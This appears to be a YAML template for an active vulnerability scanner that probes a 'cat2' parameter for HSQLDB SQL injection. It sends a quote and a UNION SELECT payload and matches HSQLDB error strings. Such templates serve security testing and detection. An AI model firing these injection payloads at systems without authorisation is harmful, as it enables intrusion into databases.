id: sqli2-hsqldb-01
name: 'SQLi error hsqldb via cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - hsqldb
description: 'Triggers hsqldb error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - ''''
        - ''' UNION SELECT NULL,NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'HSQLDB'
          - 'org.hsqldb'
